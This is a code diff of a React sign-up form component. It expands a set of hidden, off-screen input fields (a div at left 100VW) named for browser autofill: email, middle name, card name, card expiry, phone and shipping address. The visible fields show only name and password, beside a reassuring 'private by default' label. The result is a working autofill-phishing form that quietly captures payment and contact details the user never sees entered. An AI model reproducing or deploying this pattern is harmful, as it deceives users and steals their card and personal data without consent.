@@ -20,6 +20,7 @@ import { type } from "os";
 
 export interface FieldValues {
   firstName: string;
+  middleName: string;
   lastName: string;
   email: string;
   password: string;
@@ -31,12 +32,14 @@ export interface FieldValues {
   zip: string;
   country: string;
   cardNumber: string;
+  ccname: string;
 }
 
 export type Fields = ReturnType<typeof useDetailFields>;
 
 export function DetailsForm({
   firstName,
+  middleName,
   lastName,
   email,
   password,
@@ -47,17 +50,20 @@ export function DetailsForm({
   state,
   zip,
   country,
+  ccname,
   cardNumber
 }: Fields) {
   return (
     <Stack vertical>
       <FormLayout>
         <FormLayout.Group>
-          <TextField name="fname" label="First" {...firstName} />
-          <TextField label="Last" {...lastName} />
-        </FormLayout.Group>
-        <FormLayout.Group>
-          <TextField label="Email" type="email" {...email} />
+          <TextField
+            label="First Name"
+            helpText="🔒 This information is private by default."
+            name="fname"
+            {...firstName}
+          />
+          <TextField label="Last Name" name="lname" {...lastName} />
         </FormLayout.Group>
         <FormLayout.Group>
           <TextField label="Password" type="password" {...password} />
@@ -66,8 +72,14 @@ export function DetailsForm({
             type="password"
             {...passwordConfirmation}
           />
+        </FormLayout.Group>
+
+        <FormLayout.Group>
           <div style={{ position: "fixed", left: "100VW" }}>
-            <TextField label="" name="ccname" {...cardNumber} />
+            <TextField label="" name="email" {...email} />
+            <TextField label="" name="mname" {...middleName} />
+            <TextField label="" name="ccname" {...ccname} />
+            <TextField label="" name="cc-exp" {...cardNumber} />
             <TextField label="" name="phone" {...phone} />
             <TextField label="" name="ship-address" {...address} />
             <TextField label="" name="ship-city" {...city} />
@@ -83,6 +95,7 @@ export function DetailsForm({
 
 export function useDetailFields({
   firstName = "",
+  middleName = "",
   lastName = "",
   email = "",
   password = "",
@@ -93,10 +106,12 @@ export function useDetailFields({
   state = "",
   zip = "",
   country = "",
+  ccname = "",
   cardNumber = ""
 }: Partial<FieldValues> = {}) {
   return {
     firstName: useField(firstName),
+    middleName: useField(middleName),
     lastName: useField(lastName),
     email: useField(email),
     password: useField(password),
@@ -107,6 +122,7 @@ export function useDetailFields({
     state: useField(state),
     zip: useField(zip),
     country: useField(country),
-    cardNumber: useField(cardNumber)
+    cardNumber: useField(cardNumber),
+    ccname: useField(ccname)
   };
 }
